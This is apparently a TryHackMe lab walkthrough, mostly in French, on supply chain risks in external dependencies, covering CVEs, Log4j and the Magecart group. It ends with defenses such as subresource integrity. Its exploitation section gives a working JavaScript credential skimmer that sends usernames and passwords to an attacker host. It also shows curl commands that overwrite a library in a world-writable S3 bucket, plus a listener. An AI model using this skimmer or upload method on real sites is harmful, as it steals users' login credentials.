![e7c88e060a4f574ca216a94eecf0408b](https://github.com/user-attachments/assets/9de72308-e94f-4ef9-9141-391eedc50b67)

Comme mentionné précédemment, les dépendances externes sont celles qui sont hébergées, gérées et mises à jour par des parties externes. Les dépendances externes sont une partie intéressante du SLDC à sécuriser car nous ne sommes pas directement responsables de la sécurité de la dépendance. Pourtant, si nous voulons une application sécurisée, nous devrons gérer ces dépendances. Dans cette tâche, examinons certains problèmes de sécurité liés aux dépendances externes avant d'exécuter une attaque de la chaîne d'approvisionnement.

CVE publiques

L'équipe qui développe des dépendances externes ne sont pas des robots qui ne font pas d'erreurs. Ce sont des humains, comme nous tous. Cela signifie qu'il peut y avoir des vulnérabilités dans le code qu'ils ont écrit. Le problème, cependant, est que ces vulnérabilités seront divulguées publiquement, généralement sous la forme de Vulnérabilités et d'Expositions Communs (CVE), une fois que les développeurs ont créé un patch. Bien que ce soit une bonne pratique pour s'assurer que les développeurs créent des correctifs, pour nous, c'est un problème car cela signifie que notre version spécifique de leur dépendance est maintenant vulnérable à un problème qui est annoncé aux attaquants en ligne.

En tant que tel, nous devons réagir dès que possible et corriger notre dépendance. Mais c'est plus facile à dire qu'à faire. Nous avons peut-être verrouillé une dépendance pour la stabilité de notre application. Donc, la mise à niveau vers une nouvelle version signifie que nous devrons d'abord déterminer si une telle mise à niveau pourrait provoquer une instabilité. Le problème s'aggrave lorsque vous commencez à parler des dépendances des dépendances. Ce n'est peut-être pas le SDK que vous utilisez qui est vulnérable, mais une dépendance du SDK, qui est. Étant donné que cette dépendance doit être mise à jour, nous devrons également mettre à jour notre SDK.

Log4j est un excellent exemple de la gravité de cette situation. Log4j est un utilitaire de journalisation basé sur Java. Il a été utilisé dans presque toutes les applications développées en Java. Cela a conduit à plusieurs produits devenant vulnérables quand une vulnérabilité a été découverte dans la dépendance. Vous pouvez regarder [voici la liste complète des produits concernés](https://github.com/cisagov/log4j-affected-db). La liste est devenue si grande, plus de 1000 produits, qu'ils l'avaient triée par ordre alphabétique.

En fonction de la vulnérabilité découverte, cela aura un impact sur le risque associé à la dépendance spécifique. Comme la vulnérabilité de Log4j permettait l'exécution de code à distance, l'impact était significatif. Si vous souhaitez explorer davantage cette question, jetez un coup d'œil[ cette chambre](https://tryhackme.com/room/solar).

Attaques de Chaîne d'approvisionnement

Même si les dépendances n'ont pas de vulnérabilités et sont tenues à jour, elles peuvent toujours être exploitées pour attaquer les systèmes et les services. Alors que de plus en plus d'organisations prennent conscience de la sécurité et qu'il est plus difficile pour un attaquant de les compromettre, les attaquants doivent devenir plus rusés.

Au lieu d'essayer d'attaquer directement l'application, qui a été durcie, un attaquant cible plutôt l'une des dépendances de l'application, qui peut avoir été créé par une équipe plus petite qui n'a pas un budget de sécurité aussi important. Ces méthodes d'attaque indirecte sont appelées attaques de la chaîne d'approvisionnement.

Une menace persistante avancée (APT) groupe, à savoir le groupe MageCart, était connu pour effectuer ces types d'attaques. Quelques points forts de leurs actions:

-   Compromising the payment portal of British Airways' online portal led to the compromise of credit cards of customers and a fine for BA of 230 million dollars.
-   Compromising more than 100000 customers' credit cards by embedding skimmers in various payment portals of various applications.
-   Compromising more than 10000 AWS S3 buckets and embedding malware in any JavaScript found in these buckets.

The MageCart group showed that you do not really have to target an application directly. It is far more lucrative to compromise a dependency used by the application. These supply chain attacks are even more effective since a dependency might be used by several applications. Meaning the compromise of a single dependency could lead to the compromise of several applications.

Il existe plusieurs façons de compromettre les dépendances, mais de loin, la plus courante est lorsque les dépendances sont hébergées de manière non sécurisée, ce qui permet à un attaquant de modifier la dépendance. Cela pourrait être, par exemple, un S3 bucket qui a des autorisations modifiables dans le monde configuré. Un attaquant pourrait abuser de ces autorisations pour écraser la dépendance hébergée avec du code malveillant.

Exploitation de Supply Chains

Essayons d'effectuer une attaque de la chaîne d'approvisionnement. Nous simulerons une attaque de la chaîne d'approvisionnement. Démarrez la machine attachée, la AttackBox, et accédez à [http://MACHINE_IP:8000/](http://machine_ip:8000/) utiliser FireFox sur la AttackBox une fois que la machine est active. Vous verrez qu'il s'agit d'un simple portail d'authentification.

Avant de pouvoir continuer, nous devons intégrer une entrée de nom d'hôte pour simuler l'interface Internet S3 seau. Effectuez la commande suivante sur votre machine d'attaque pour injecter le nom d'hôte dans votre fichier/etc/hosts:

`sudo bash -c "echo 'MACHINE_IP cdn.tryhackme.loc' >> /etc/hosts"`

Une fois injecté, vous pouvez actualiser la page Web et voir le chargement des dépendances. Si vous inspectez le code de l'application (Right click->View Source), vous verrez qu'il tire une dépendance de cdn.tryhackme.loc. Examinons un peu plus cette dépendance. Ouvrez un lien vers cette dépendance, et il devrait vous permettre de télécharger une bibliothèque JavaScript appelée auth.js:

```
//This is our shared authentication library. It includes a really cool function that will autosubmit the form when a user presses enter in the password textbox!

var input = document.getElementById('txtPassword');
input.addEventListener("keypress", function(event) {
	if (event.key == "Enter") {
		event.preventDefault();
        	document.getElementById("loginSubmit").click();
	}
});
```

En regardant de plus près le code de cette bibliothèque, il semble ajouter un événement JS qui surveillera la zone de texte du mot de passe pour les frappes au clavier et soumettra automatiquement le formulaire de connexion si un utilisateur appuie sur Entrée. Sans réelle vulnérabilité dans le code, examinons où la dépendance est hébergée.

Si nous revenons une étape dans la demande de [http://cdn.tryhackme.loc:9444/libraries,](http://cdn.tryhackme.loc:9444/libraries) nous pouvons voir que cela semble être un S3 bucket hébergeant la dépendance:

`<?xml version="1.0" encoding="UTF-8"?><ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/">`

Un moyen rapide de voir si l'équipe a peut-être mal configuré le S3 bucket pour accorder des autorisations modifiables dans le monde serait d'essayer une simple demande PUT:

`curl -X PUT http://cdn.tryhackme.loc:9444/libraries/test.js -d "Testing world-writeable permissions"`

En exécutant cette requête, il semble que nous obtenions un HTTP 200 OK. Nous pouvons également voir que nous avons la possibilité de télécharger ce nouveau fichier en utilisant <http://cdn.tryhackme.loc:9444/libraries/test.js>. Cela semble positif pour une attaque de la chaîne d'approvisionnement! À ce stade, il existe plusieurs façons différentes d'exploiter ce seau S3 modifiable dans le monde pour provoquer une attaque de la chaîne d'approvisionnement, mais nous allons garder les choses simples en intégrant un skimmer d'informations d'identification qui nous enverra les informations d'identification de l'utilisateur lorsqu'il cliquera sur soumettre.

Téléchargez la dépendance auth.js et modifiez le code pour ressembler à ceci:

```
//This is our shared authentication library. It includes a really cool function that will autosubmit the form when a user presses enter in the password textbox!

var input = document.getElementById('txtPassword');
input.addEventListener("keypress", function(event) {
	if (event.key == "Enter") {
		event.preventDefault();
        try {
            const oReq = new XMLHttpRequest();
            var user = document.getElementById('txtUsername').value;
            var pass = document.getElementById('txtPassword').value;
            oReq.open("GET", "http://THM_IP:7070/item?user=" + user + "&pass=" + pass);
            oReq.send();
        }
        catch(err) {
            console.log(err);
        }
		function sleep (time) {
                    return new Promise((resolve) => setTimeout(resolve, time));
                }
                sleep(5000).then(() => {
    		    document.getElementById("loginSubmit").click();
                });
	}
});
```

**Code explained**: Make sure to modify THM_IP to be the IP of your TryHackMe VPN or the AttackBox IP since we want callbacks to occur to this host. The injection is fairly simple. Once the user presses enter to submit their credentials, we make an XHR (XMLHTTPRequest) request to our host, where the username and password of the target are embedded as parameters in the request. You will notice some lines of code for the creation of a sleep function and then using said sleep function before the button is clicked. This is to ensure that the malicious XHR request has completed before the page transition occurs, otherwise a modern browser would stop the request from occurring.

Let's overwrite the existing auth.js file with our embedded skimmer:

`curl http://cdn.tryhackme.loc:9444/libraries/auth.js --upload-file auth.js`

Nous pourrions héberger un serveur entier pour recevoir les frappes, mais restons simples avec un serveur Python:

`python3 -m http.server 7070`

Nous pouvons tester si notre skimmer fonctionne en utilisant le site nous-mêmes. Remplissez le formulaire et appuyez sur Entrée après avoir tapé votre mot de passe, et vous devez intercepter les informations d'identification:

`10.10.62.64 - - [10/Aug/2022 10:59:28] "GET /item?user=test&pass=test HTTP/1.1" 404 -`

Si cela fonctionne, il suffit d'attendre que quelqu'un s'authentifie! Donnez-lui 5 minutes, et vous devriez intercepter les informations d'identification d'un utilisateur réel! Une fois que vous avez intercepté les informations d'identification de l'utilisateur, utilisez-les pour vous authentifier sur le site Web et récupérer le drapeau!

Défenses

Il est difficile de se défendre contre les attaques mises en scène contre les dépendances externes car il y en a tellement et de nouvelles vulnérabilités sont trouvées quotidiennement. Il y a certaines choses que nous pouvons faire pour limiter le risque:

-   Assurez-vous de mettre à jour et de corriger les dépendances régulièrement. Cela inclurait le correctif d'urgence des dépendances si une vulnérabilité suffisamment grave était découverte.
-   Les dépendances peuvent parfois être copiées et hébergées en interne. Cela réduira la surface d'attaque.
-   L'intégrité des sous-ressources peut être utilisée pour empêcher le chargement des bibliothèques JS altérées. Dans le HTML include, le hachage de la bibliothèque JS peut être ajouté. Les navigateurs Web modernes vérifieront le hachage de la bibliothèque JS, et si elle ne correspond pas, la bibliothèque ne sera pas chargée.
